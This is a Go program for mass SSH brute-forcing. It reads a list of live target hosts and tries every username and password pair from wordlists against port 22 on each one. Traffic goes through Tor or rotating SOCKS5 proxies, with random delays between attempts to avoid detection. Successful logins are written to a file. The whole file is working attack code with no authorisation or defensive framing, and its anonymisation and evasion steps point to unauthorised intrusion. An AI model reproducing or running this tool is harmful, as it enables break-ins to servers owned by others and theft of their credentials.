package main

import (
    "bufio"
    "fmt"
    "golang.org/x/crypto/ssh"
    "golang.org/x/net/proxy"
    "math/rand"
    "net"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var torEnabled = true   // Enable Tor by default (must be running)
var torSocks5 = "127.0.0.1:9050" // Default Tor SOCKS5 Proxy

var proxyList []string // Stores proxies from Python's checked_proxies.txt
var proxyLock sync.Mutex

// Load proxies from checked_proxies.txt
func loadProxies(proxyFile string) {
    file, err := os.Open(proxyFile)
    if err != nil {
        fmt.Println("[ERROR] Could not load proxy file:", err)
        return
    }
    defer file.Close()

    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        proxy := strings.TrimSpace(scanner.Text())
        if proxy != "" {
            proxyList = append(proxyList, proxy)
        }
    }
    fmt.Printf("[INFO] Loaded %d proxies.\n", len(proxyList))
}

// Get a random proxy from the list
func getRandomProxy() string {
    proxyLock.Lock()
    defer proxyLock.Unlock()
    if len(proxyList) == 0 {
        return ""
    }
    return proxyList[rand.Intn(len(proxyList))]
}

// Function to attempt SSH login via proxy
func attemptSSHLogin(ip, port, user, password, proxyAddr string) bool {
    var dialer net.Dialer
    var conn net.Conn
    var err error

    // If Tor is enabled, use the Tor SOCKS5 proxy
    if torEnabled {
        socksDialer, err := proxy.SOCKS5("tcp", torSocks5, nil, proxy.Direct)
        if err != nil {
            fmt.Println("[ERROR] Failed to connect to Tor SOCKS5 proxy:", err)
            return false
        }
        conn, err = socksDialer.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
    } else if proxyAddr != "" {
        // Use SOCKS5 Proxy from Python's checked_proxies.txt
        socksDialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
        if err != nil {
            fmt.Println("[ERROR] Failed to connect to proxy:", proxyAddr, err)
            return false
        }
        conn, err = socksDialer.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
    } else {
        conn, err = dialer.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
    }

    if err != nil {
        return false
    }
    defer conn.Close()

    clientConfig := &ssh.ClientConfig{
        User: user,
        Auth: []ssh.AuthMethod{
            ssh.Password(password),
        },
        HostKeyCallback: ssh.InsecureIgnoreHostKey(), // Do NOT use this in production!
        Timeout:         10 * time.Second,
    }

    sshConn, err := ssh.NewClientConn(conn, fmt.Sprintf("%s:%s", ip, port), clientConfig)
    if err != nil {
        return false
    }
    defer sshConn.Close()

    fmt.Printf("[SUCCESS] SSH login: %s:%s - %s:%s\n", ip, port, user, password)
    saveSuccessfulLogin(fmt.Sprintf("%s:%s - %s:%s\n", ip, port, user, password))
    return true
}

// Save successful logins
func saveSuccessfulLogin(output string) {
    file, err := os.OpenFile("sparte.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return
    }
    defer file.Close()
    file.WriteString(output)
}

// Scan SSH ports and brute force
func scanAndBruteForce(ip string, users, passwords []string, port string, wg *sync.WaitGroup, successCount *int64) {
    defer wg.Done()

    proxyAddr := getRandomProxy() // Get a proxy for this attack

    for _, user := range users {
        for _, password := range passwords {
            if attemptSSHLogin(ip, port, user, password, proxyAddr) {
                atomic.AddInt64(successCount, 1)
            }
            time.Sleep(time.Duration(rand.Intn(3)+1) * time.Second) // Random delay
        }
    }
}

// Read file into slice
func readFileLines(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var lines []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        lines = append(lines, strings.TrimSpace(scanner.Text()))
    }
    return lines, scanner.Err()
}

// Main function
func main() {
    fmt.Println("[INFO] Starting SSH Bruteforce...")

    // Load proxies
    loadProxies("proxy_lists/checked_proxies.txt")

    // Load usernames and passwords
    usernames, err := readFileLines("wordlists/ssh_usernames.txt")
    if err != nil {
        fmt.Println("[ERROR] Failed to load username wordlist:", err)
        return
    }
    passwords, err := readFileLines("wordlists/ssh_passwords.txt")
    if err != nil {
        fmt.Println("[ERROR] Failed to load password wordlist:", err)
        return
    }

    // Load IPs from file
    ips, err := readFileLines("results/live_hosts.txt")
    if err != nil {
        fmt.Println("[ERROR] Failed to load target IPs:", err)
        return
    }

    var wg sync.WaitGroup
    var successCount int64

    for _, ip := range ips {
        wg.Add(1)
        go scanAndBruteForce(ip, usernames, passwords, "22", &wg, &successCount)
    }

    wg.Wait()
    fmt.Printf("[INFO] Bruteforce complete. Total successful logins: %d\n", successCount)
}
